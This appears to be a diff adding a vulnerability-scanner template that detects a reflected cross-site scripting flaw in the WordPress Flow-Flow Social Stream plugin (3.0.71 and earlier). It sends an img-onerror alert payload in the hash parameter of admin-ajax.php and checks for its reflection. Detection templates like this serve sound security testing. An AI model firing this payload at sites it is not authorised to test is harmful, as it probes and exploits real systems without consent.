@@ -1,0 +1,26 @@
+id: flow-flow-social-stream-xss
+name: WordPress Flow-Flow Social Stream <=3.0.71 - Cross-Site Scripting
+severity: medium
+confidence: tentative
+description: WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.
+reference: CWE-80
+tags:
+- xss
+- wordpress
+- wpscan
+- vuln
+requests:
+- method: GET
+  path: /wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+  matchers:
+  - type: body
+    words:
+    - '"hash":"<img src=x onerror=alert(document.domain)>"'
+    - '"errors"'
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
